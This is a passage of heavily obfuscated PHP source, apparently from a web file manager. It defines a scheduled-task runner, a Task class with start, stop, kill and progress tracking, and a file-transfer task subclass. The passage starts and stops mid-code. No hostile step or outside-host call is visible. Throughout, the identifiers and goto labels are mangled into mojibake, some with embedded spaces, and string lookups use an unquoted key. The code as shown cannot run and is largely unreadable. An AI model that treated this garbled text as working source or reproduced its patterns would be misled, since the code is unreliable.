$Dä¥Ãá„œÉ[1537]: if (time() - $E®ÖîÙ«ä´ < 3600 * 24 * 7) { return !1; } $BÒŸë™…âë = date($Dä¥Ãá„œÉ[1538]) == 0 ? 7 : date($Dä¥Ãá„œÉ[1538]); if ($c÷ Øâºêå[$Dä¥Ãá„œÉ[1537]] == $BÒŸë™…âë && $eÑﬁÈ≤≈ÿ) { return !0; } break; case $Dä¥Ãá„œÉ[1530]: if (time() - $E®ÖîÙ«ä´ < 3600 * 24) { return !1; } if ($eÑﬁÈ≤≈ÿ) { return !0; } break; case $Dä¥Ãá„œÉ[1539]: if (time() - $E®ÖîÙ«ä´ >= floatval($c÷ Øâºêå[$Dä¥Ãá„œÉ[1539]]) * 60) { return !0; } break; default: break; } return !1; goto C¶¬ëî§…ç; fê–¡µîËÂ: $EûŸ≤ÖÖù™ = strtotime($Dä¥Ãá„œÉ[1529] . $c÷ Øâºêå[$Dä¥Ãá„œÉ[1530]] . $Dä¥Ãá„œÉ[1531]) - strtotime($Dä¥Ãá„œÉ[1532]); $c∏®¿ú…‘Í = time() - strtotime(date($Dä¥Ãá„œÉ[1533]) . $Dä¥Ãá„œÉ[1534]); $eÑﬁÈ≤≈ÿ = $c∏®¿ú…‘Í >= $EûŸ≤ÖÖù™ && $c∏®¿ú…‘Í <= $EûŸ≤ÖÖù™ + 3600; goto D¬„ú˜é™; f≈Û∞È«§ı: $Dä¥Ãá„œÉ =& $_SERVER[’ÿƒ†ïò]; $c÷ Øâºêå = json_decode($BøÑ·∂åœ±[$Dä¥Ãá„œÉ[197]], !0); $E®ÖîÙ«ä´ = intval($BøÑ·∂åœ±[$Dä¥Ãá„œÉ[1521]]); goto fê–¡µîËÂ; C¶¬ëî§…ç: } private static function closeDatabase() { goto cì„±˘åø‡; b™Ï„∆Ωí…: $Eíßàƒ°¯Ø = Model($cÖµÒ©ñÚ÷[507])->db($cÖµÒ©ñÚ÷[33]); if ($Eíßàƒ°¯Ø) { $Eíßàƒ°¯Ø->closeConnect(); } if (time() - TIME > 3600 * 24 * 3) { write_log($cÖµÒ©ñÚ÷[1540], $cÖµÒ©ñÚ÷[1541]); die; } goto EŸ∏Ö≤ÑËó; Eñ»ÖçÏ‰¡: if (!$d√Ò£Üﬁèê) { $d√Ò£Üﬁèê = time(); } if (time() - $d√Ò£Üﬁèê < $bÂË“÷À÷◊) { return; } $d√Ò£Üﬁèê = time(); goto b™Ï„∆Ωí…; cì„±˘åø‡: $cÖµÒ©ñÚ÷ =& $_SERVER[’ÿƒ†ïò]; static $d√Ò£Üﬁèê = 0; $bÂË“÷À÷◊ = 300; goto Eñ»ÖçÏ‰¡; EŸ∏Ö≤ÑËó: } public static function taskRun($eá—Û’·¡À) { goto cÛÎÒΩ¿⁄Ç; b±†Âª‰Ÿâ: return !0; goto aı«ÉèË·≤; eèåê√ûıƒ: $dœ»ºç÷≤÷ = timeFloat(); $bé—Õ√¯û´ = $fÊ°ëæÉ∆î[33]; switch ($eá—Û’·¡À[$fÊ°ëæÉ∆î[29]]) { case $fÊ°ëæÉ∆î[305]: $A˜èø Æ”∏ = url_request($eá—Û’·¡À[$fÊ°ëæÉ∆î[1545]], $fÊ°ëæÉ∆î[228], !1, !1, !1, !1, 10); if ($A˜èø Æ”∏[$fÊ°ëæÉ∆î[738]]) { $bé—Õ√¯û´ = strlen($A˜èø Æ”∏[$fÊ°ëæÉ∆î[1116]]); } break; case $fÊ°ëæÉ∆î[227]: $bé—Õ√¯û´ = Hook::apply($eá—Û’·¡À[$fÊ°ëæÉ∆î[1545]]); default: break; } goto fœÆ÷ÜàŸö; cÛÎÒΩ¿⁄Ç: $fÊ°ëæÉ∆î =& $_SERVER[’ÿƒ†ïò]; self::log($fÊ°ëæÉ∆î[1542] . $eá—Û’·¡À[$fÊ°ëæÉ∆î[395]] . $fÊ°ëæÉ∆î[1543] . $eá—Û’·¡À[$fÊ°ëæÉ∆î[28]] . $fÊ°ëæÉ∆î[1544] . $eá—Û’·¡À[$fÊ°ëæÉ∆î[1545]]); Model($fÊ°ëæÉ∆î[1526])->run($eá—Û’·¡À[$fÊ°ëæÉ∆î[395]]); goto eèåê√ûıƒ; fœÆ÷ÜàŸö: Model($fÊ°ëæÉ∆î[1546])->add(array($fÊ°ëæÉ∆î[1547] => $fÊ°ëæÉ∆î[33], $fÊ°ëæÉ∆î[1548] => $fÊ°ëæÉ∆î[191], $fÊ°ëæÉ∆î[29] => $fÊ°ëæÉ∆î[1549] . $eá—Û’·¡À[$fÊ°ëæÉ∆î[395]], $fÊ°ëæÉ∆î[1550] => json_encode(array($fÊ°ëæÉ∆î[28] => $eá—Û’·¡À[$fÊ°ëæÉ∆î[28]], $fÊ°ëæÉ∆î[1551] => timeFloat() - $dœ»ºç÷≤÷, $fÊ°ëæÉ∆î[291] => $bé—Õ√¯û´)))); $B¯øﬂå›®Ø = $bé—Õ√¯û´ ? $fÊ°ëæÉ∆î[1552] . $bé—Õ√¯û´ : $fÊ°ëæÉ∆î[33]; self::log($fÊ°ëæÉ∆î[1553] . $eá—Û’·¡À[$fÊ°ëæÉ∆î[395]] . $fÊ°ëæÉ∆î[530] . $B¯øﬂå›®Ø); goto b±†Âª‰Ÿâ; aı«ÉèË·≤: } private static function valueGet($d≥ Í£‰…‰) { $BŸçÙúë∂ =& $_SERVER[’ÿƒ†ïò]; $bÂ—◊øÒΩ≈ = $BŸçÙúë∂[1554]; $BõªÖ®˜‡ı = Model($BŸçÙúë∂[427])->get($d≥ Í£‰…‰, $bÂ—◊øÒΩ≈); if (is_null($BõªÖ®˜‡ı)) { Model($BŸçÙúë∂[427])->set($BŸçÙúë∂[738], $BŸçÙúë∂[87], $bÂ—◊øÒΩ≈); Model($BŸçÙúë∂[427])->set($BŸçÙúë∂[1520], $BŸçÙúë∂[191], $bÂ—◊øÒΩ≈); $BõªÖ®˜‡ı = Model($BŸçÙúë∂[427])->get($d≥ Í£‰…‰, $bÂ—◊øÒΩ≈); } return $BõªÖ®˜‡ı; } private static function valueSet($F≥≈˜éòÙÀ, $aêÌΩÑıÛ‰) { $BÆ´áôòÃß =& $_SERVER[’ÿƒ†ïò]; $b‹ª„Òå·¥ = $BÆ´áôòÃß[1555]; CacheLock::lock($b‹ª„Òå·¥); $fèËπ…’±± = Model($BÆ´áôòÃß[427])->set($F≥≈˜éòÙÀ, $aêÌΩÑıÛ‰, $BÆ´áôòÃß[1554]); CacheLock::unlock($b‹ª„Òå·¥); return $fèËπ…’±±; } protected static function log($f”ºÏº„»ˆ) { write_log($f”ºÏº„»ˆ, $_SERVER[’ÿƒ†ïò][1541]); } private static function cacheClear() { $e√øÊÈ¥Ë… =& $_SERVER[’ÿƒ†ïò]; Cache::clearMemory(Model($e√øÊÈ¥Ë…[427])->cacheKey($e√øÊÈ¥Ë…[1554])); Cache::clearMemory(Model($e√øÊÈ¥Ë…[427])->cacheKey($e√øÊÈ¥Ë…[1556])); Model($e√øÊÈ¥Ë…[1526])->cacheClear(); self::closeDatabase(); } } class Task { const STATYS_STOP = "\x73\x74\x6f\160"; const STATYS_RUNNING = "\x72\x75\x6e\156\x69\x6e\147"; const STATYS_KILL = "\x6b\151\x6c\x6c"; public $task; public function __destruct() { $this->end(); } public function __construct($dÏÙ«Áöèß, $E¶…±êèâß = '', $FÇﬁŒ‚§πâ = 0, $C‹°àˆÜºÖ = '') { goto e·„≈åπìò; e·„≈åπìò: $C≈àÖºèêæ =& $_SERVER[’ÿƒ†ïò]; if (self::get($dÏÙ«Áöèß)) { return; } $this->task = array($C≈àÖºèêæ[395] => $dÏÙ«Áöèß, $C≈àÖºèêæ[1557] => USER_ID, $C≈àÖºèêæ[1460] => $C‹°àˆÜºÖ, $C≈àÖºèêæ[29] => $E¶…±êèâß, $C≈àÖºèêæ[1052] => $C≈àÖºèêæ[33], $C≈àÖºèêæ[1050] => $FÇﬁŒ‚§πâ, $C≈àÖºèêæ[1064] => 0, $C≈àÖºèêæ[1558] => 0, $C≈àÖºèêæ[1559] => 0, $C≈àÖºèêæ[777] => timeFloat(), $C≈àÖºèêæ[776] => 0, $C≈àÖºèêæ[1560] => 0, $C≈àÖºèêæ[1561] => 0, $C≈àÖºèêæ[1562] => 0, $C≈àÖºèêæ[738] => $C≈àÖºèêæ[1520]); goto CÚ´äø»Ó£; CÚ´äø»Ó£: $GLOBALS[$C≈àÖºèêæ[1563]] = 1; Hook::bind($C≈àÖºèêæ[1522], array($this, $C≈àÖºèêæ[1564])); Hook::bind($C≈àÖºèêæ[1565], array($this, $C≈àÖºèêæ[1566])); goto fÁ–Ò≠Ò¶ç; fÁ–Ò≠Ò¶ç: $this->startAfter(); Hook::trigger($C≈àÖºèêæ[1567], $this->task); $this->task[$C≈àÖºèêæ[1560]] = timeFloat(); goto A¡Øπ⁄ª¶®; A¡Øπ⁄ª¶®: } public function end() { goto añ´çÑùıå; añ´çÑùıå: $Cãæ™ˆû∆√ =& $_SERVER[’ÿƒ†ïò]; if (!$this->task) { return; } if ($this->task[$Cãæ™ˆû∆√[1560]]) { self::valueSet($this->task[$Cãæ™ˆû∆√[395]], !1); } goto fìÂë√‹ˆ—; dÕ∏ë¿…©ı: Hook::unbind($Cãæ™ˆû∆√[1565], array($this, $Cãæ™ˆû∆√[1566])); $this->endAfter(); $this->task = !1; goto dà·©Ì≤ø™; fìÂë√‹ˆ—: $Eê‚ÜÇîüù = timeFloat() - $this->task[$Cãæ™ˆû∆√[777]]; self::log($Cãæ™ˆû∆√[1568] . $this->task[$Cãæ™ˆû∆√[395]] . $Cãæ™ˆû∆√[1569] . $Eê‚ÜÇîüù . $Cãæ™ˆû∆√[1570]); Hook::unbind($Cãæ™ˆû∆√[1522], array($this, $Cãæ™ˆû∆√[1564])); goto dÕ∏ë¿…©ı; dà·©Ì≤ø™: } public function update($Bö†Üùô«⁄ = 0, $eú¢—§´√¡ = false) { goto AËüÃ∂◊Ç∂; Fﬁ◊∞“öΩ∑: $this->updateAfter(); $Aì∑À†‚µ∆ = 0.2; if (timeFloat() - $dˆÃÑÑü…≤[$D®ú«∞ÍïÓ[1560]] < $Aì∑À†‚µ∆ && !$eú¢—§´√¡) { return; } goto a©∞ÃÚ»Ÿ; a©∞ÃÚ»Ÿ: $E¿—ÕôËÆØ = self::get($dˆÃÑÑü…≤[$D®ú«∞ÍïÓ[395]]); $c∏ÖÕÉÌ±¢ = $E¿—ÕôËÆØ[$D®ú«∞ÍïÓ[738]]; if ($c∏ÖÕÉÌ±¢ == self::STATYS_KILL) { $cÚã–¿ÍÓ≈ = array($D®ú«∞ÍïÓ[1571] => LNG($D®ú«∞ÍïÓ[1572]), $D®ú«∞ÍïÓ[1114] => !1); Cache::set($D®ú«∞ÍïÓ[1573] . $this->task[$D®ú«∞ÍïÓ[395]], $cÚã–¿ÍÓ≈, 30); $this->onKill(); $this->end(); die; } else { if ($c∏ÖÕÉÌ±¢ == self::STATYS_STOP) { $B‹Ë»ä»è = 2; $E¿—ÕôËÆØ[$D®ú«∞ÍïÓ[1561]] += $B‹Ë»ä»è; self::valueSet($dˆÃÑÑü…≤[$D®ú«∞ÍïÓ[395]], $E¿—ÕôËÆØ); sleep($B‹Ë»ä»è); $this->update(); return; } } goto BüÃ·®—‘…; BüÃ·®—‘…: $dˆÃÑÑü…≤[$D®ú«∞ÍïÓ[738]] = $c∏ÖÕÉÌ±¢ ? $c∏ÖÕÉÌ±¢ : $dˆÃÑÑü…≤[$D®ú«∞ÍïÓ[738]]; $dˆÃÑÑü…≤[$D®ú«∞ÍïÓ[1561]] = $E¿—ÕôËÆØ[$D®ú«∞ÍïÓ[1561]] ? $E¿—ÕôËÆØ[$D®ú«∞ÍïÓ[1561]] : 0; $dˆÃÑÑü…≤[$D®ú«∞ÍïÓ[1560]] = timeFloat(); goto b∑ŸˆÔà∫¡; b∑ŸˆÔà∫¡: Hook::trigger($D®ú«∞ÍïÓ[1574], $dˆÃÑÑü…≤); self::valueSet($dˆÃÑÑü…≤[$D®ú«∞ÍïÓ[395]], $dˆÃÑÑü…≤); goto EÍ¿è«ä¿ú; CıœƒÜéŸß: $dˆÃÑÑü…≤[$D®ú«∞ÍïÓ[1064]] += $Bö†Üùô«⁄; $dˆÃÑÑü…≤[$D®ú«∞ÍïÓ[776]] = timeFloat(); if ($dˆÃÑÑü…≤[$D®ú«∞ÍïÓ[1050]]) { if ($dˆÃÑÑü…≤[$D®ú«∞ÍïÓ[1050]] < $dˆÃÑÑü…≤[$D®ú«∞ÍïÓ[1064]]) { $dˆÃÑÑü…≤[$D®ú«∞ÍïÓ[1050]] = $dˆÃÑÑü…≤[$D®ú«∞ÍïÓ[1064]]; } $e¶îòé¶Ñµ = timeFloat() - $dˆÃÑÑü…≤[$D®ú«∞ÍïÓ[777]] - $dˆÃÑÑü…≤[$D®ú«∞ÍïÓ[1561]]; $dˆÃÑÑü…≤[$D®ú«∞ÍïÓ[1558]] = $dˆÃÑÑü…≤[$D®ú«∞ÍïÓ[1064]] / $dˆÃÑÑü…≤[$D®ú«∞ÍïÓ[1050]]; $dˆÃÑÑü…≤[$D®ú«∞ÍïÓ[1559]] = $dˆÃÑÑü…≤[$D®ú«∞ÍïÓ[1064]] / $e¶îòé¶Ñµ; if ($dˆÃÑÑü…≤[$D®ú«∞ÍïÓ[1558]] > 0) { $dˆÃÑÑü…≤[$D®ú«∞ÍïÓ[1562]] = $e¶îòé¶Ñµ * (1 - $dˆÃÑÑü…≤[$D®ú«∞ÍïÓ[1558]]) / $dˆÃÑÑü…≤[$D®ú«∞ÍïÓ[1558]]; } $dˆÃÑÑü…≤[$D®ú«∞ÍïÓ[1562]] = $dˆÃÑÑü…≤[$D®ú«∞ÍïÓ[1562]] <= 0 ? 0 : $dˆÃÑÑü…≤[$D®ú«∞ÍïÓ[1562]]; } goto Fﬁ◊∞“öΩ∑; AËüÃ∂◊Ç∂: $D®ú«∞ÍïÓ =& $_SERVER[’ÿƒ†ïò]; $dˆÃÑÑü…≤ =& $this->task; if (!$dˆÃÑÑü…≤) { return; } goto CıœƒÜéŸß; EÍ¿è«ä¿ú: } public function onKillSet($F”øÉ˘ñ≤¥, $FÒÏ⁄îßÛà = array()) { $this->onKillCall = array($F”øÉ˘ñ≤¥, $FÒÏ⁄îßÛà); } public function onKill() { $dﬂ€µ©õ¥π =& $_SERVER[’ÿƒ†ïò]; self::log($dﬂ€µ©õ¥π[1568] . $this->task[$dﬂ€µ©õ¥π[395]] . $dﬂ€µ©õ¥π[1575]); if (!$this->onKillCall) { return; } ActionApply($this->onKillCall[0], $this->onKillCall[1]); $this->onKillCall = !1; } protected function updateAfter() { } protected function startAfter() { } protected function endAfter() { } public function shutdownEvent() { $this->end(); } public function showJson($aõ‡…¿πë€) { $Dá‰”ﬁ»òê =& $_SERVER[’ÿƒ†ïò]; Cache::set($Dá‰”ﬁ»òê[1573] . $this->task[$Dá‰”ﬁ»òê[395]], $aõ‡…¿πë€, 60); return $aõ‡…¿πë€; } public static function get($a∏Ñß‡èç¯) { $e≠√î‹Üà‡ =& $_SERVER[’ÿƒ†ïò]; $F¬ƒ’é¯£ä = self::valueGet($a∏Ñß‡èç¯); if (is_array($F¬ƒ’é¯£ä) && $F¬ƒ’é¯£ä[$e≠√î‹Üà‡[1576]]) { $b»÷öß›ÉÀ = ActionApply($F¬ƒ’é¯£ä[$e≠√î‹Üà‡[1576]], array($F¬ƒ’é¯£ä)); $F¬ƒ’é¯£ä = is_array($b»÷öß›ÉÀ) ? $b»÷öß›ÉÀ : $F¬ƒ’é¯£ä; } return $F¬ƒ’é¯£ä; } public static function listData() { $C…Ωˆ»ªÎñ = self::valueGet(); return array_sort_by($C…Ωˆ»ªÎñ, $_SERVER[’ÿƒ†ïò][777], !0); } public static function kill($dùœ”Í≤æ∂) { return self::changeStatus($dùœ”Í≤æ∂, self::STATYS_KILL); } public static function stop($Fáä°”¢¨´) { return self::changeStatus($Fáä°”¢¨´, self::STATYS_STOP); } public static function restart($bØ™ÃÇ€ö˜) { return self::changeStatus($bØ™ÃÇ€ö˜, self::STATYS_RUNNING); } public static function killAll() { $FËêéæç¡¡ =& $_SERVER[’ÿƒ†ïò]; $EÊ‚·ﬁÒΩå = self::listData(); foreach ($EÊ‚·ﬁÒΩå as $dá∏âçéÕ∂) { self::kill($dá∏âçéÕ∂[$FËêéæç¡¡[395]]); } sleep(2); foreach ($EÊ‚·ﬁÒΩå as $dá∏âçéÕ∂) { self::valueSet($dá∏âçéÕ∂[$FËêéæç¡¡[395]], !1); } } private static function changeStatus($Dæ¡„·ÓÀﬂ, $d®¶¬à…∫•) { goto a≠ÈÜÆ¢π; a≠ÈÜÆ¢π: $FÈç≈Ñ´Ë◊ =& $_SERVER[’ÿƒ†ïò]; $eáﬂµÃëõ∞ = self::valueGet($Dæ¡„·ÓÀﬂ); if (!$eáﬂµÃëõ∞) { return !1; } goto e“ÿ“¯™Üº; e“ÿ“¯™Üº: $eáﬂµÃëõ∞[$FÈç≈Ñ´Ë◊[738]] = $d®¶¬à…∫•; self::valueSet($Dæ¡„·ÓÀﬂ, $eáﬂµÃëõ∞); self::log($FÈç≈Ñ´Ë◊[1577] . $eáﬂµÃëõ∞[$FÈç≈Ñ´Ë◊[395]] . $FÈç≈Ñ´Ë◊[1578] . $d®¶¬à…∫•); goto F’»˘Ü©Û™; F’»˘Ü©Û™: return !0; goto F‘Çö’ù«¯; F‘Çö’ù«¯: } public static function valueGet($c¯êê€≤⁄Ö = false) { $c”ÙÕú©£– =& $_SERVER[’ÿƒ†ïò]; if ($c¯êê€≤⁄Ö) { $a“í∆¡Æ¿ã = Model($c”ÙÕú©£–[439])->where(array($c”ÙÕú©£–[93] => $c¯êê€≤⁄Ö, $c”ÙÕú©£–[29] => $c”ÙÕú©£–[1579]))->find(); return $a“í∆¡Æ¿ã ? json_decode($a“í∆¡Æ¿ã[$c”ÙÕú©£–[372]], !0) : !1; } return self::taskListUser(USER_ID); } public static function taskListUser($fæÚñıﬁ¨é = false) { goto b¯¶∏é‹ûç; bé‹¥ˆÏ¨√: return $D«£ÊΩ◊Èó; goto a·∏÷€è≤À; A‚â”ˆπõ‘: $D«£ÊΩ◊Èó = Model($d≤ÌîÂ¨»ˆ[439])->where($c∏€∑öÉºŸ)->select(); $D«£ÊΩ◊Èó = $D«£ÊΩ◊Èó ? $D«£ÊΩ◊Èó : array(); foreach ($D«£ÊΩ◊Èó as $E†ªÜöïãˆ => $f– §ˆÓÀ‰) { $D«£ÊΩ◊Èó[$E†ªÜöïãˆ] = json_decode($f– §ˆÓÀ‰[$d≤ÌîÂ¨»ˆ[372]], !0); } goto bé‹¥ˆÏ¨√; b¯¶∏é‹ûç: $d≤ÌîÂ¨»ˆ =& $_SERVER[’ÿƒ†ïò]; $c∏€∑öÉºŸ = array($d≤ÌîÂ¨»ˆ[29] => $d≤ÌîÂ¨»ˆ[1579]); if ($fæÚñıﬁ¨é) { $c∏€∑öÉºŸ[$d≤ÌîÂ¨»ˆ[1557]] = $fæÚñıﬁ¨é; } goto A‚â”ˆπõ‘; a·∏÷€è≤À: } public static function valueSet($d⁄∑ òÎ∞Ë, $eπŒ¥œ¢ÍÛ) { goto f§©áõ≠…Œ; C—›ÎÓ∑®œ: if (!$b äñ–Ø®˜) { ob_start(); var_dump($eπŒ¥œ¢ÍÛ); $B°òöﬂÃôÕ = ob_get_clean(); self::log($dÑˆ‡ßô™Õ[1580] . json_encode_force($B°òöﬂÃôÕ)); } if (!$d⁄∑ òÎ∞Ë || !$eπŒ¥œ¢ÍÛ[$dÑˆ‡ßô™Õ[395]]) { return !1; } $aÈ◊ôÈÇ’È = array($dÑˆ‡ßô™Õ[29] => $dÑˆ‡ßô™Õ[1579], $dÑˆ‡ßô™Õ[1557] => USER_ID, $dÑˆ‡ßô™Õ[93] => $d⁄∑ òÎ∞Ë, $dÑˆ‡ßô™Õ[372] => $b äñ–Ø®˜); goto EÉ˘–Ë£îø; f§©áõ≠…Œ: $dÑˆ‡ßô™Õ =& $_SERVER[’ÿƒ†ïò]; if (!$eπŒ¥œ¢ÍÛ) { return Model($dÑˆ‡ßô™Õ[439])->where(array($dÑˆ‡ßô™Õ[93] => $d⁄∑ òÎ∞Ë, $dÑˆ‡ßô™Õ[29] => $dÑˆ‡ßô™Õ[1579]))->delete(); } $b äñ–Ø®˜ = json_encode($eπŒ¥œ¢ÍÛ); goto C—›ÎÓ∑®œ; EÉ˘–Ë£îø: $a˘ç‰†Ü√È = $dÑˆ‡ßô™Õ[1581]; CacheLock::lock($a˘ç‰†Ü√È); Model($dÑˆ‡ßô™Õ[439])->add($aÈ◊ôÈÇ’È, array(), !0); goto c‰‹êÊ∏πá; c‰‹êÊ∏πá: CacheLock::unlock($a˘ç‰†Ü√È); goto AÏ≈¥Ûœñê; AÏ≈¥Ûœñê: } public static function log($D©Çë◊ıÈ§) { if (!GLOBAL_DEBUG) { return; } write_log($D©Çë◊ıÈ§, $_SERVER[’ÿƒ†ïò][1582]); } } class TaskFileTransfer extends Task { protected function startAfter() { goto EèŸ≈Ù¢”§; fâÌÖæ§»ç: Hook::bind($cÙÜÍÈƒåâ[1595], array($this, $cÙÜÍÈƒåâ[1596])); Hook::bind($cÙÜÍÈƒåâ[1597], array($this, $cÙÜÍÈƒåâ[1598])); Hook::bind($cÙÜÍÈƒåâ[1599], array($this, $cÙÜÍÈƒåâ[1600])); goto e§ªºÉπã¡; e∆∫óì§ÊÖ: Hook::bind($cÙÜÍÈƒåâ[1592], array($this, $cÙÜÍÈƒåâ[1593])); Hook::bind($cÙÜÍÈƒåâ[585], array($this, $cÙÜÍÈƒåâ[1594])); $this->sourceModelCopyFlag = !1; goto fâÌÖæ§»ç; EèŸ≈Ù¢”§: $cÙÜÍÈƒåâ =& $_SERVER[’ÿƒ†ïò]; $B∂∆îß¯ãÈ =& $this->task; $this->sourceCopyFolder = !1; goto E•ø–ı·‰ÿ; e§ªºÉπã¡: $B∂∆îß¯ãÈ[$cÙÜÍÈƒåâ[1601]] = LNG($cÙÜÍÈƒåâ[1602]); $B∂∆îß¯ãÈ[$cÙÜÍÈƒåâ[1603]] = 0; $B∂∆îß¯ãÈ[$cÙÜÍÈƒåâ[1604]] = 0; goto E÷êé®˜¢ù; E÷êé®˜¢ù: $B∂∆îß¯ãÈ[$cÙÜÍÈƒåâ[1052]] = $cÙÜÍÈƒåâ[33]; $B∂∆îß¯ãÈ[$cÙÜÍÈƒåâ[1605]] = $cÙÜÍÈƒåâ[33]; $B∂∆îß¯ãÈ[$cÙÜÍÈƒåâ[1606]] = 0; goto däıÒÉµŒ¢; D‘∫•∞ΩÛ¬: Hook::bind($cÙÜÍÈƒåâ[564], array($this, $cÙÜÍÈƒåâ[1591])); Hook::bind($cÙÜÍÈƒåâ[566], array($this, $cÙÜÍÈƒåâ[1591])); Hook::bind($cÙÜÍÈƒåâ[568], array($this, $cÙÜÍÈƒåâ[1591])); goto e∆∫óì§ÊÖ; E•ø–ı·‰ÿ: Hook::bind($cÙÜÍÈƒåâ[1583], array($this, $cÙÜÍÈƒåâ[1584])); Hook::bind($cÙÜÍÈƒåâ[1138], array($this, $cÙÜÍÈƒåâ[1585])); Hook::bind($cÙÜÍÈƒåâ[1586], array($this, $cÙÜÍÈƒåâ[1587])); goto fê¡Ö∂äÉ‰; e¿Ø‡◊Øâß: Hook::bind($cÙÜÍÈƒåâ[596], array($this, $cÙÜÍÈƒåâ[1590])); Hook::bind($cÙÜÍÈƒåâ[562], array($this, $cÙÜÍÈƒåâ[1591])); Hook::bind($cÙÜÍÈƒåâ[559], array($this, $cÙÜÍÈƒåâ[1591])); goto D‘∫•∞ΩÛ¬; fê¡Ö∂äÉ‰: Hook::bind($cÙÜÍÈƒåâ[592], array($this, $cÙÜÍÈƒåâ[1588])); Hook::bind($cÙÜÍÈƒåâ[593], array($this, $cÙÜÍÈƒåâ[1589])); Hook::bind($cÙÜÍÈƒåâ[595], array($this, $cÙÜÍÈƒåâ[1590])); goto e¿Ø‡◊Øâß; däıÒÉµŒ¢: $B∂∆îß¯ãÈ[$cÙÜÍÈƒåâ[1607]] = 0; $B∂∆îß¯ãÈ[$cÙÜÍÈƒåâ[1608]] = 0; if (!$B∂∆îß¯ãÈ[$cÙÜÍÈƒåâ[1460]]) { $B∂∆îß¯ãÈ[$cÙÜÍÈƒåâ[1460]] = LNG($cÙÜÍÈƒåâ[1609]); } goto eèãÁ∆€òΩ; eèãÁ∆€òΩ: } protected function endAfter() { goto DÌ∑∆Ùñ√Ó; DÁõá¢—∂: Hook::unbind($Eÿÿ ÂçôÖ[568], array($this, $Eÿÿ ÂçôÖ[1591])); Hook::unbind($Eÿÿ ÂçôÖ[1592], array($this, $Eÿÿ ÂçôÖ[1593])); Hook::unbind($Eÿÿ ÂçôÖ[585], array($this, $Eÿÿ ÂçôÖ[1594])); goto cÉÕŒœ‹≤; aã⁄àÈ—∫≤: Hook::unbind($Eÿÿ ÂçôÖ[595], array($this, $Eÿÿ ÂçôÖ[1590])); Hook::unbind($Eÿÿ ÂçôÖ[596], array($this, $Eÿÿ ÂçôÖ[1590])); Hook::unbind($Eÿÿ ÂçôÖ[562], array($this, $Eÿÿ ÂçôÖ[1591])); goto FÚöË£¢ﬁ•; Aº·œ¥◊ÈÚ: Hook::unbind($Eÿÿ ÂçôÖ[1586], array($this, $Eÿÿ ÂçôÖ[1587])); Hook::unbind($Eÿÿ ÂçôÖ[592], array($this, $Eÿÿ ÂçôÖ[1588])); Hook::unbind($Eÿÿ ÂçôÖ[593], array($this, $Eÿÿ ÂçôÖ[1589])); goto aã⁄àÈ—∫≤; FÚöË£¢ﬁ•: Hook::unbind($Eÿÿ ÂçôÖ[559], array($this, $Eÿÿ ÂçôÖ[1591])); Hook::unbind($Eÿÿ ÂçôÖ[564], array($this, $Eÿÿ ÂçôÖ[1591])); Hook::unbind($Eÿÿ ÂçôÖ[566], array($this, $Eÿÿ ÂçôÖ[1591])); goto DÁõá¢—∂; cÉÕŒœ‹≤: Hook::unbind($Eÿÿ ÂçôÖ[1595], array($this, $Eÿÿ ÂçôÖ[1596])); Hook::unbind($Eÿÿ ÂçôÖ[1597], array($this, $Eÿÿ ÂçôÖ[1598])); Hook::unbind($Eÿÿ ÂçôÖ[1599], array($this, $Eÿÿ ÂçôÖ[1600])); goto cº˘Ö‹¶éï; DÌ∑∆Ùñ√Ó: $Eÿÿ ÂçôÖ =& $_SERVER[’ÿƒ†ïò]; Hook::unbind($Eÿÿ ÂçôÖ[1583], array($this, $Eÿÿ ÂçôÖ[1584])); Hook::unbind($Eÿÿ ÂçôÖ[1138], array($this, $Eÿÿ ÂçôÖ[1585])); goto Aº·œ¥◊ÈÚ; cº˘Ö‹¶éï: } public function copyMoveStart($fÑÔÔéªåê, $eÍãäåè≈à, $déåëÉ◊©‡, $aÚ‘ÿ°äÖ∫) { goto F‹ÉÏé¥ø¥; D∂Ï˜§ëø: if (substr($eÍãäåè≈à, 0, strlen($c∞ÜÆéÆ…Ô)) == $c∞ÜÆéÆ…Ô) { return; } if (substr($aÚ‘ÿ°äÖ∫, 0, strlen($c∞ÜÆéÆ…Ô)) == $c∞ÜÆéÆ…Ô) { return; } $d–äÃë«‚√ =& $this->task; goto EÇ◊è◊Ñﬁæ; EÇ◊è◊Ñﬁæ: $d–äÃë«‚√[$f§¢∞è·ôÁ[1611]] = KodIO::transferType($fÑÔÔéªåê, $déåëÉ◊©‡); $this->update(); goto cﬂÁ‚áùÎ; F‹ÉÏé¥ø¥: $f§¢∞è·ôÁ =& $_SERVER[’ÿƒ†ïò]; self::log($f§¢∞è·ôÁ[1610] . $eÍãäåè≈à . $f§¢∞è·ôÁ[67] . $aÚ‘ÿ°äÖ∫); $c∞ÜÆéÆ…Ô = rtrim(TEMP_FILES, $f§¢∞è·ôÁ[8]); goto D∂Ï˜§ëø; cﬂÁ‚áùÎ: } public function updateAfter() { $d £ıÚ˜ä¡ =& $_SERVER[’ÿƒ†ïò]; $eÜ‚∂Ì∑ıΩ =& $this->task; if (!$eÜ‚∂Ì∑ıΩ[$d £ıÚ˜ä¡[751]]) { return; } if ($this->sourceModelCopyFlag) { return; } if ($eÜ‚∂Ì∑ıΩ[$d £ıÚ˜ä¡[1611]] == $d £ıÚ˜ä¡[1211]) { return; } self::updateTask($eÜ‚∂Ì∑ıΩ); } private static function updateTask(&$F§÷íä–Ñ¬) { $f©ë¡˜Ω√Ω =& $_SERVER[’ÿƒ†ïò]; if ($F§÷íä–Ñ¬[$f©ë¡˜Ω√Ω[1611]] == $f©ë¡˜Ω√Ω[1122] || $F§÷íä–Ñ¬[$f©ë¡˜Ω√Ω[1611]] == $f©ë¡˜Ω√Ω[107]) { if ($F§÷íä–Ñ¬[$f©ë¡˜Ω√Ω[1605]]) { $F§÷íä–Ñ¬[$f©ë¡˜Ω√Ω[1608]] = $F§÷íä–Ñ¬[$f©ë¡˜Ω√Ω[1607]] + $F§÷íä–Ñ¬[$f©ë¡˜Ω√Ω[1604]]; } } else { if ($F§÷íä–Ñ¬[$f©ë¡˜Ω√Ω[1611]] == $f©ë¡˜Ω√Ω[1212]) { if ($F§÷íä–Ñ¬[$f©ë¡˜Ω√Ω[1605]] == $f©ë¡˜Ω√Ω[1122]) { $F§÷íä–Ñ¬[$f©ë¡˜Ω√Ω[1608]] = $F§÷íä–Ñ¬[$f©ë¡˜Ω√Ω[1607]] + $F§÷íä–Ñ¬[$f©ë¡˜Ω√Ω[1604]] * 0.5; } else { if ($F§÷íä–Ñ¬[$f©ë¡˜Ω√Ω[1605]] == $f©ë¡˜Ω√Ω[107]) { $F§÷íä–Ñ¬[$f©ë¡˜Ω√Ω[1608]] = 